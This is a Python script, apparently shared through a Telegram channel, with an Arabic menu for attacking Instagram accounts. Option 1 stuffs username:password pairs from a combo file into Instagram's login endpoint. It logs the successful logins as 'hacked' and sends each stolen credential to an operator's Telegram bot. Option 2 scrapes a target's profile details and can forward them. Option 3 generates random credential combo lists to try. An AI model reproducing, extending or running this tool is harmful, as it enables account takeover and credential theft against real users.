import requests



import os



import random



import json



import threading



import secrets,uuid



from colorama import Fore, Style



from time import sleep



from datetime import datetime



from secrets import token_hex



from uuid import uuid4



from user_agent import generate_user_agent







r   = requests.Session()



G   = Fore.GREEN



R   = Fore.RED



Y   = Fore.YELLOW







hacked = 0



secure = 0



factor = 0



blocked= 0



bad    = 0



error  = 0







uid = uuid.uuid4()



cookie  = secrets.token_hex(8)*2



time_now= int(datetime.now().timestamp())



while True:



    os.system('cls' if os.name == 'nt' else 'clear')



    banner = (G+"""__  .__   __.      _______.___________.    ___      
|  | |  \ |  |     /       |           |   /   \     
|  | |   \|  |    |   (----`---|  |----`  /  ^  \    
|  | |  . `  |     \   \       |  |      /  /_\  \   
|  | |  |\   | .----)   |      |  |     /  _____  \  
|__| |__| \__| |_______/       |__|    /__/     \__\ 
""")



    print(banner)



    #Free telegram:@pythoons


    print("❖"*60)


    try:



        print(' ')



    except:



        pass



    tele_pythoons = input(Y+"""[1] صيد حسابات انستا
[2] معلومات حساب انستا
[3] انشأء لسته كومبو للفحص
[+] اختر اداة واحده فقط » """)
    if tele_pythoons == '1':
        print("#"*60)
        r = requests.Session()



        banner = (G+"""__  .__   __.      _______.___________.    ___      
|  | |  \ |  |     /       |           |   /   \     
|  | |   \|  |    |   (----`---|  |----`  /  ^  \    
|  | |  . `  |     \   \       |  |      /  /_\  \   
|  | |  |\   | .----)   |      |  |     /  _____  \  
|__| |__| \__| |_______/       |__|    /__/     \__\ 
 """)



        print(banner)



        print('==========================')
        ID = input("ادخل ايدي حسابك==>")
        tokan = input("ادخل توكن بوتك==>")



        try:



            print(' ')



        except:



            pass



        print(Style.RESET_ALL)



        for account in open('Combo.txt','r').read().splitlines():



            username = account.split(':')[0]



            password = account.split(':')[1]



            try:



                cookies = token_hex(8)*2



                url = 'https://www.instagram.com/accounts/login/ajax/'



                headers = {"user-agent": generate_user_agent(), 'x-csrftoken': 'missing',



                           'mid': token_hex(8) * 2}



                data = {'username':username,



                        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),



                        'queryParams': '{}',



                        'optIntoOneTap': 'false',}



                req_login = r.post(url,headers=headers,data=data, proxies=None)



                sleep(0.5)



                if ("userId") in req_login.text:



                    with open('Hacked.txt','a') as HACKED:



                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
                        SGDVIP = (f'https://api.telegram.org/bot{tokan}/sendMessage?chat_id={ID}&text=تم صيد حساب انستا 🥺💛\n---------------------------------\nuser=>{username}\npassword==>{password}\n°°°°°°°°°°°°°°°°°°°°°°°°\ntele==> @SGDVIP')
                        k = requests.post(SGDVIP)
                    hacked += 1



                    os.system('cls' if os.name == 'nt' else 'clear')



                    print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")



                else:



                    if ('checkpoint_required') in req_login.text:



                        with open('Secure.txt', 'a') as SECURE:



                            SECURE.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))



                        secure += 1



                        os.system('cls' if os.name == 'nt' else 'clear')



                        print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")



                    else:



                        if ('two_factor_required') in req_login.text:



                            with open('two_factor.txt', 'a') as FACTOR:



                                FACTOR.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))



                            factor += 1



                            os.system('cls' if os.name == 'nt' else 'clear')



                            print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")



                        else:



                            if ('Please wait a few minutes before you try again.') in req_login.text:



                                blocked += 1



                                sleep(8)



                                os.system('cls' if os.name == 'nt' else 'clear')



                                print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")



                            else:



                                bad += 1



                                os.system('cls' if os.name == 'nt' else 'clear')



                                print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")



            except Exception as cc:



                print(cc)



                error += 1



                sleep(10)



                os.system('cls' if os.name == 'nt' else 'clear')



                print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")



    if tele_pythoons == '2':


        print("#"*60)


        banner = (G+'''__  .__   __.      _______.___________.    ___      
|  | |  \ |  |     /       |           |   /   \     
|  | |   \|  |    |   (----`---|  |----`  /  ^  \    
|  | |  . `  |     \   \       |  |      /  /_\  \   
|  | |  |\   | .----)   |      |  |     /  _____  \  
|__| |__| \__| |_______/       |__|    /__/     \__\ 
''')



        print(banner)



        print("~"*60)



        head = {



            'HOST': "www.instagram.com",



            'KeepAlive' : 'True',



            'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",



            'Cookie': cookie,



            'Accept' : "*/*",



            'ContentType' : "application/x-www-form-urlencoded",



            "X-Requested-With" : "XMLHttpRequest",



            "X-IG-App-ID": "936619743392459",



            "X-Instagram-AJAX" : "missing",



            "X-CSRFToken" : "missing",



            "Accept-Language" : "en-US,en;q=0.9"



        }



        #Free telegram:@pythoons


        target = input(Y+'[+] Enter User : ')



        url_id = f'https://www.instagram.com/{target}/?__a=1'



        req_id = r.get(url_id,headers=head).json()



        bio    = str(req_id['graphql']['user']['biography'])



        url    = str(req_id['graphql']['user']['external_url'])



        nam    = str(req_id['graphql']['user']['full_name'])



        idd    = str(req_id['graphql']['user']['id'])



        isp    = str(req_id['graphql']['user']['is_private'])



        isv    = str(req_id['graphql']['user']['is_verified'])



        pro    = str(req_id['graphql']['user']['profile_pic_url'])



        print(Y+"==================================")



        print(G+f'telegram:@pythoons\nالاسم : {nam}\nالايدي : {idd}\nالنشر : {isp}\nتم التحقق : {isv}\nالبايو : {bio}\nالبروفايل : {pro}')



        print(Y+"==================================")



        ask = input(Y+'[+] هل تريد ارساله الئ بوت التليجرام [y-n] >> ')



        if ask == "y":



            print(' ')



            ID = input('[+] Enter Telegram ID : ')



            token = input('[+] Enter Token Bot Telegram : ')



            pythoons = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=py=@pythoons\n❖ الاسم : {nam}\n❖ الايدي : {idd}\n❖ النشر : {isp}\n❖ تم التحقق : {isv}\n❖ البايو : {bio}\n❖  البروفايل : {pro}'



            r.get(pythoons)



            print(f'[-] Done Send Msg to >> {ID}')



            print(Style.RESET_ALL)



        else:



            print(Style.RESET_ALL)



            pass



    if tele_pythoons == '3':

        print("#"*60)

        banner = (G+"""__  .__   __.      __________________.    ___      

|  | |  \ |  |     /       |           |   /   \  
|  | |   \|  |    |   (----`---|  |----`  /  ^  \ 
|  | |  . `  |     \   \       |  |      /  /_\  \   

|  | |  |\   | .----)   |      |  |     /  _____  \ 
|__| |__| \__| |_______/       |__|    /__/     \__\ 

        """)



        print(banner)



        print('==========================')



        chars    = 'izvxcdbshafdterqwioplkmn0987654132'



        username = int(input(Y+'[+] Enter User lenth : '))



        comboo   = int(input("[+] Enter combo length : "))



        password = open("pass.txt",'r').read().splitlines()



        l = 0



        while l <= comboo:



            user = str(''.join(random.choice(chars) for i in range(username)))



            with open("Combo.txt",'a') as wr:



                wr.write(user+":"+random.choice(password)+'\n')



                wr.close()



                l += 1



                if l == comboo:



                    print(Y+f'[-] Done Make Combo List')



                    try:



                        print(' ')



                    except:



                        pass



                    sleep(3)
